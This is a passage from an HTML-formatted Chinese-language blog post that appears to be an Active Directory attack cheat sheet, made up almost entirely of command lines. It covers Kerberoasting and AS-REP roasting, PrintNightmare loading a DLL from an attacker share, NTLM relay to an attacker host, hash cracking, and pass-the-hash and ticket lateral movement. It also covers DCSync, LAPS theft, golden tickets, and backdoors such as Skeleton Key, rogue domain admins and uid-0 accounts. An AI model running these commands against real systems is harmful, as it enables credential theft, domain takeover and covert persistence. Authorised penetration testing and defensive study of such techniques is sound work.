-format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line"></span><br><span class="line">Rubeus asreproast &#x2F;format:hashcat</span><br></pre></td></tr></table></figure><h4 id="获取ASREP-Roastable账号"><a href="#获取ASREP-Roastable账号" class="headerlink" title="获取ASREP-Roastable账号"></a>获取ASREP-Roastable账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired -Properties SamAccountName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="拿到任意一个域用户的账号密码"><a href="#拿到任意一个域用户的账号密码" class="headerlink" title="拿到任意一个域用户的账号密码"></a>拿到任意一个域用户的账号密码</h2><h3 id="获取其他账户密码"><a href="#获取其他账户密码" class="headerlink" title="获取其他账户密码"></a>获取其他账户密码</h3><h4 id="1-获取域内所有账户名"><a href="#1-获取域内所有账户名" class="headerlink" title="1.获取域内所有账户名"></a>1.获取域内所有账户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;username&gt;</span><br></pre></td></tr></table></figure><h4 id="2-枚举-SMB-共享"><a href="#2-枚举-SMB-共享" class="headerlink" title="2.枚举 SMB 共享"></a>2.枚举 SMB 共享</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</span><br></pre></td></tr></table></figure><h4 id="3-bloodhound"><a href="#3-bloodhound" class="headerlink" title="3.bloodhound"></a>3.bloodhound</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</span><br></pre></td></tr></table></figure><h4 id="4-powerview-pywerview"><a href="#4-powerview-pywerview" class="headerlink" title="4.powerview / pywerview"></a>4.powerview / pywerview</h4><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><h4 id="获取hash-1"><a href="#获取hash-1" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;</span><br><span class="line"></span><br><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure><h4 id="查找-kerberoastable-账号"><a href="#查找-kerberoastable-账号" class="headerlink" title="查找 kerberoastable 账号"></a>查找 kerberoastable 账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) RETURN u</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>FindSMB2UPTime.py <ip></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames &lt;name&gt;</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;&lt;ticket&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2021-1675.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#39;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#39;</span><br></pre></td></tr></table></figure><h3 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a>枚举 DNS 服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnstool.py -u &#39;DOMAIN\user&#39; -p &#39;password&#39; --record &#39;*&#39; --action query &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure><h1 id="7-relay-poisoning攻击"><a href="#7-relay-poisoning攻击" class="headerlink" title="7.relay/poisoning攻击"></a>7.relay/poisoning攻击</h1><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a>扫描没开启SMB签名的机器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS&#x2F;MASK</span><br><span class="line"></span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay</span><br><span class="line"></span><br><span class="line">cme smb $hosts --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure><h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure><p>后续可以跟着adcs攻击</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responder -i eth0</span><br><span class="line">mitm6 -d &lt;domain&gt;</span><br></pre></td></tr></table></figure><h2 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名 || 开启IPv6 || ADCS"></a>无SMB签名 || 开启IPv6 || ADCS</h2><h3 id="1-MS08-068"><a href="#1-MS08-068" class="headerlink" title="1.MS08-068"></a>1.MS08-068</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay #常用于windows2003 &#x2F; windows server2008</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 # 记得先关闭本机的 smb 和 http 服务</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt </span><br></pre></td></tr></table></figure><h3 id="2-mitm6-i-eth0-d"><a href="#2-mitm6-i-eth0-d" class="headerlink" title="2.mitm6 -i eth0 -d "></a>2.mitm6 -i eth0 -d <domain></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb:&#x2F;&#x2F;&lt;target&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldaps:&#x2F;&#x2F;&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access</span><br><span class="line"></span><br><span class="line">getST.py -spn cifs&#x2F;&lt;target&gt; &lt;domain&gt;&#x2F;&lt;netbios_name&gt;\$ -impersonate &lt;user&gt;</span><br></pre></td></tr></table></figure><h3 id="3-adcs"><a href="#3-adcs" class="headerlink" title="3.adcs"></a>3.adcs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t http:&#x2F;&#x2F;&lt;dc_ip&gt;&#x2F;certsrv&#x2F;certfnsh.asp -debug -smb2support --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt &#x2F;user:&lt;user&gt; &#x2F;certificate:&lt;base64-certificate&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="拿到hash破解"><a href="#拿到hash破解" class="headerlink" title="拿到hash破解"></a>拿到hash破解</h2><h4 id="1-LM"><a href="#1-LM" class="headerlink" title="1.LM"></a>1.LM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;lm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2.NTLM"></a>2.NTLM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;nt hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="3-NTLMv1"><a href="#3-NTLMv1" class="headerlink" title="3.NTLMv1"></a>3.NTLMv1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5500 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="4-NTLMv2"><a href="#4-NTLMv2" class="headerlink" title="4.NTLMv2"></a>4.NTLMv2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlmv2 hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure><h4 id="5-Kerberos-5-TGS"><a href="#5-Kerberos-5-TGS" class="headerlink" title="5.Kerberos 5 TGS"></a>5.Kerberos 5 TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john spn.txt --format&#x3D;krb5tgs --wordlist&#x3D;rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 spn.txt rockyou.txt</span><br></pre></td></tr></table></figure><h4 id="6-Kerberos-ASREP"><a href="#6-Kerberos-ASREP" class="headerlink" title="6.Kerberos ASREP"></a>6.Kerberos ASREP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</span><br></pre></td></tr></table></figure><h1 id="9-横向移动"><a href="#9-横向移动" class="headerlink" title="9.横向移动"></a>9.横向移动</h1><h2 id="1-PTH"><a href="#1-PTH" class="headerlink" title="1.PTH"></a>1.PTH</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;</span><br><span class="line"></span><br><span class="line">evil-winrm -i &lt;ip&gt;&#x2F;&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp &#x2F;u:&lt;user&gt; &#x2F;d:&lt;domain&gt; &#x2F;pth:&lt;hash&gt; &#x2F;v:&lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="2-PTK"><a href="#2-PTK" class="headerlink" title="2.PTK"></a>2.PTK</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python getTGT.py &lt;domain&gt;&#x2F;&lt;user&gt; -hashes :&lt;hashes&gt;</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-examples&#x2F;domain_ticket.ccache</span><br><span class="line">python psexec.py &lt;domain&gt;&#x2F;&lt;user&gt;@&lt;ip&gt; -k -no-pass</span><br><span class="line"></span><br><span class="line">Rubeus asktgt &#x2F;user:victim &#x2F;rc4:&lt;rc4value&gt;</span><br><span class="line">Rubeus ptt &#x2F;ticket:&lt;ticket&gt;</span><br><span class="line">Rubeus createnetonly &#x2F;program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</span><br><span class="line">Rubeus ptt &#x2F;luid:0xdeadbeef &#x2F;ticket:&lt;ticket&gt;</span><br></pre></td></tr></table></figure><h2 id="3-非约束委派"><a href="#3-非约束委派" class="headerlink" title="3.非约束委派"></a>3.非约束委派</h2><h3 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;export</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure><h3 id="查找非约束委派主机"><a href="#查找非约束委派主机" class="headerlink" title="查找非约束委派主机"></a>查找非约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -Unconstrained -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="4-约束委派"><a href="#4-约束委派" class="headerlink" title="4.约束委派"></a>4.约束委派</h2><h3 id="获取票据-1"><a href="#获取票据-1" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure><h3 id="查找约束委派主机"><a href="#查找约束委派主机" class="headerlink" title="查找约束委派主机"></a>查找约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer), (t:Computer), p&#x3D;((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="5-基于资源的约束委派"><a href="#5-基于资源的约束委派" class="headerlink" title="5.基于资源的约束委派"></a>5.基于资源的约束委派</h2><h2 id="6-dcsync"><a href="#6-dcsync" class="headerlink" title="6.dcsync"></a>6.dcsync</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:htb.local &#x2F;user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行</span><br></pre></td></tr></table></figure><h2 id="7-打印机-SpoolService-漏洞利用"><a href="#7-打印机-SpoolService-漏洞利用" class="headerlink" title="7.打印机 SpoolService 漏洞利用"></a>7.打印机 SpoolService 漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</span><br><span class="line">printerbug.py &#39;&lt;domain&gt;&#x2F;&lt;username&gt;:&lt;password&gt;&#39;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</span><br></pre></td></tr></table></figure><h2 id="8-AD域ACL攻击-aclpwn-py"><a href="#8-AD域ACL攻击-aclpwn-py" class="headerlink" title="8.AD域ACL攻击(aclpwn.py)"></a>8.AD域ACL攻击(aclpwn.py)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GenericAll on User</span><br><span class="line">GenericAll on Group</span><br><span class="line">GenericAll &#x2F; GenericWrite &#x2F; Write on Computer</span><br><span class="line">WriteProperty on Group</span><br><span class="line">Self (Self-Membership) on Group</span><br><span class="line">WriteProperty (Self-Membership)</span><br><span class="line">ForceChangePassword</span><br><span class="line">WriteOwner on Group</span><br><span class="line">GenericWrite on User</span><br><span class="line">WriteDACL + WriteOwner</span><br></pre></td></tr></table></figure><h2 id="9-获取LAPS管理员密码"><a href="#9-获取LAPS管理员密码" class="headerlink" title="9.获取LAPS管理员密码"></a>9.获取LAPS管理员密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</span><br><span class="line"></span><br><span class="line">foreach ($objResult in $colResults)&#123;$objComputer &#x3D; $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="10-privexchange漏洞"><a href="#10-privexchange漏洞" class="headerlink" title="10.privexchange漏洞"></a>10.privexchange漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;&lt;dc_fqdn&gt;--escalate-user &lt;user&gt;</span><br></pre></td></tr></table></figure><h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a>Exchange的利用</h5><ul><li><a href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li><li><a href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li><li><a href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a></li><li><a href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li><li><a href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li><li><a href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li><li><a href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li><li><a href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li></ul><h2 id="11-IPC"><a href="#11-IPC" class="headerlink" title="11.IPC"></a>11.IPC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line">net use \\ip\c$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="12-其他横移"><a href="#12-其他横移" class="headerlink" title="12.其他横移"></a>12.其他横移</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.向WSUS服务器数据库注入恶意程序更新WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器</span><br><span class="line"></span><br><span class="line">2.MSSQL Trusted Linksuse exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler</span><br><span class="line"></span><br><span class="line">3.GPO Delegation</span><br><span class="line"></span><br><span class="line">4.ADCS</span><br><span class="line"></span><br><span class="line">5.钉钉 6.3.5 RCE https:&#x2F;&#x2F;github.com&#x2F;crazy0x70&#x2F;dingtalk-RCE</span><br><span class="line"></span><br><span class="line">6.向日葵11.1 RCE</span><br></pre></td></tr></table></figure><h1 id="10-权限维持"><a href="#10-权限维持" class="headerlink" title="10.权限维持"></a>10.权限维持</h1><h2 id="拿到域控权限"><a href="#拿到域控权限" class="headerlink" title="拿到域控权限"></a>拿到域控权限</h2><p>dump ntds.dit 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</span><br><span class="line"></span><br><span class="line">secretsdump.py &#39;&lt;domain&gt;&#x2F;&lt;user&gt;:&lt;pass&gt;&#39;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</span><br><span class="line"></span><br><span class="line">secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</span><br><span class="line"></span><br><span class="line">windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump</span><br></pre></td></tr></table></figure><h2 id="Windows后门"><a href="#Windows后门" class="headerlink" title="Windows后门"></a>Windows后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; myuser &#x2F;add &#x2F;domain</span><br><span class="line"></span><br><span class="line">Golden ticket（黄金票据）</span><br><span class="line"></span><br><span class="line">Silver Ticket（白银票据）</span><br><span class="line"></span><br><span class="line">DSRM 后门：</span><br><span class="line">PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</span><br><span class="line"></span><br><span class="line">Skeleton Key：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">自定义 SSP DLL：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure><h2 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> # echo &quot;0range ALL&#x3D;(ALL) ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers 将现有普通用户添加为 sudo 用户</span><br><span class="line"> # useradd -u 0 -g 0 -o adv -m -s &#x2F;bin&#x2F;bash 添加超管账户</span><br><span class="line">ps: 相比贸然去新增用户, 把系统中现有的普通用户提升为 sudo 用户可能会更靠谱点</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><h3 id="子域攻击父域-SID-History版跨域黄金票据"><a href="#子域攻击父域-SID-History版跨域黄金票据" class="headerlink" title="子域攻击父域 - SID History版跨域黄金票据"></a>子域攻击父域 - SID History版跨域黄金票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid</span><br><span class="line"></span><br><span class="line">mimikatz lsadump::trust</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;krbtgt:&lt;HASH_KRBTGT&gt; &#x2F;domain:&lt;domain&gt; &#x2F;sid:&lt;user_sid&gt; &#x2F;sids:&lt;RootDomainSID-519&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure><h3 id="利用域信任密钥获取目标域的权限-信任票据"><a href="#利用域信任密钥获取目标域的权限-信任票据" class="headerlink" title="利用域信任密钥获取目标域的权限 - 信任票据"></a>利用域信任密钥获取目标域的权限 - 信任票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;lsadump::trust &#x2F;patch&quot;</span><br><span class="line">&quot;lsadump::lsa &#x2F;patch&quot;</span><br><span class="line"></span><br><span class="line">&quot;kerberos::golden &#x2F;user:Administrator &#x2F;domain:&lt;domain&gt; &#x2F;sid:  </span><br><span class="line">&lt;domain_SID&gt; &#x2F;rc4:&lt;trust_key&gt; &#x2F;service:krbtgt &#x2F;target:&lt;target_domain&gt; &#x2F;ticket:</span><br><span class="line">&lt;golden_ticket_path&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="攻击其它林"><a href="#攻击其它林" class="headerlink" title="攻击其它林"></a>攻击其它林</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击</span><br></pre></td></tr></table></figure><h2 